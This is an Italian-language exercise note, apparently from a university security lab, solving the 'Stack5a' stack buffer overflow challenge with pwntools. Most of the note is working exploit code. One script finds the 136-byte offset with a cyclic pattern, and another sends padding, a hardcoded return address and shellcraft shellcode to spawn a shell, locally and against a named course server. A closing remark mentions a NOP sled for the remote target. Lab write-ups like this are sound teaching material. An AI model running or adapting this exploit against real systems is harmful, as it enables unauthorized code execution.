# Stack5a

## Local

ssh -p 4422 stack5@lettieri.iet.unipi.it

```py
from pwn import *


# il coso da eseguire
context.binary = ELF(path="./stack5a")

p = process()

p.send("kek") # p.sendline("kek") anche l'haccapo


# tiene la shell viva
p.interactive()
```

`cyclic` per capire l'offset della gets


```py
from pwn import *

# il coso da eseguire
context.binary = ELF(path="./stack5a")

p = remote(host="localhost", port=4405)


payload = cyclic(length=300)


p.send(payload) # p.sendline("kek") anche l'haccapo

# tiene la shell viva
p.interactive()
```

usando la gdb abbiamo visto 136


posso jumpare in un indirizzo a caso es "0x7fffffffdb08" e li ci scrivo la roba che voglio eseguire


```py
from pwn import ELF, context, p64, remote, shellcraft, asm

# il coso da eseguire
context.binary = ELF(path="./stack5a")

p = remote(host="localhost", port=4405)

shellcode=shellcraft.sh()

shellcode=asm(shellcode)

p.sendline(b"A" * 136 + p64(0x7fffffffdb18) + b"B"*8 + shellcode) 

# tiene la shell viva
p.interactive()
```

## Remote


nc lettieri.iet.unipi.it 4422


di solito lo stack non sta nello stesso posto, questa volta però è fermo `STACK-ASLR`

ssh e guardo dove sta lo stack

poi metto le `NOP` in modo che ad un certo punto arrivi in esecuzione


